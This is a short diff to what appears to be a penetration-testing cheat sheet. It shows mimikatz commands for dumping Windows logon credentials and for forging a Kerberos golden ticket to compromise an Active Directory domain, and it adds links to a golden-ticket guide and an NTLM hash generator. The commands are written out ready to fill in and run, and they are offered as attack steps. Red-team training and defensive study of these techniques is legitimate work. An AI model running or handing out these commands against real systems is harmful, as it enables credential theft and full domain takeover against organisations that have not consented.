@@ -777,11 +777,12 @@ Run Powershell as administrator to get a shell as NT AUTHORITY/system
 sekurlsa::logonPasswords full
 ```
 
-Generating a golden ticket on kerberos:  
-https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/
+Generating a golden ticket on kerberos using mimikatz:  
+https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/  
 
 ```
 mimikatz# kerberos::golden /admin:<USERNAME> /domain:<DOMAIN> /id:<FAKE_RID> /sid:<SID> /krbtgt:<NTLM_HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt
 ```
 
-
+NTLM Password Generator if you do not have a NTLM hash  
+https://www.browserling.com/tools/ntlm-hash  
